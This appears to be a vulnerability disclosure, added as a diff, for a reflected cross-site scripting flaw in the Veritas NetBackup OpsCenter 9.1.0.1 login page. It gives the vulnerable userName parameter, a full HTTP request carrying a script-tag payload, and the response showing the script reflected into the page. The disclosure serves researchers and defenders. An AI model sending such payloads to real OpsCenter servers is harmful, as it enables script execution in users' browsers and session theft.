@@ -1,0 +1,95 @@
+Reflected Cross-Site Scripting (XSS) attack
+--------------------------------------------
+
+Version: Veritas NetBackUp OpsCenter Version 9.1.0.1
+
+Type: Unauthenticated Remote attack
+
+We have identified that the "Veritas NetBackUp OpsCenter Version 9.1.0.1" login web page is vulnerable to Reflective Cross-site scripting (XSS). This is due to that the Web App fails to adequately sanitize special characters. By leveraging this issue, an attacker is able to cause arbitrary HTML and JavaScript code to be executed in a user's browser within the security context of the affected site. This attack can be used in conjunction with a social engineering techniques.
+
+The injection point is in the "userName" input parameter of the HTML Login Form. We have managed to exploit this issue by crafting the "userName" parameter in the URL path (as an HTTP GET parameter) and inserting the XSS payload as value.
+
+
+Below, evidence is provided.
+
+
+Request:
+GET /opscenter/login.spring?userName=ithaca%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22labs HTTP/1.1
+Host: 1.1.1.1:8443
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: JSESSIONID=734164A1BCACE93B2F3F283837EC944C
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+
+
+
+Response:
+HTTP/1.1 200 
+Cache-Control: private, no-cache, no-store, max-age=0
+Content-Security-Policy: upgrade-insecure-requests
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=15552000
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+vary: accept-encoding
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Date: Tue, 00 Feb 2023 11:11:11 GMT
+Connection: close
+Content-Length: 11139
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,IE=11">
+  
+    
+    <title>Veritas NetBackup OpsCenter</title>
+  
+  
+    <link rel="shortcut icon" href="/opscenter/features/common/images/favicon.ico" />
+  
+
+  <link rel="stylesheet" type="text/css" href="/opscenter/webcommon/common/include/login.css?version=20210824" />
+
+
+[...]
+
+
+<form id="loginForm" class="loginForm" action="login.spring" method="post" onsubmit="return showLoginMessage('false', '', 'false')">
+  
+    
+[...]
+  
+  
+  <br />
+  <!-- div for common message end -->
+          
+  <div class="holder">
+    <div class="login-label">Username:</div>
+    <div>
+      <input id="username" name="userName" class="InputBox" tabindex="1" accesskey="U" type="text" value="ithaca"><script>alert("XSS")</script><"labs" size="20" autocomplete="off"/>
+    </div>
+  </div>
+ 
+
+[...]
+
+  
+</form>
+
+
+[...]
+
+  
+</body>
+</html>
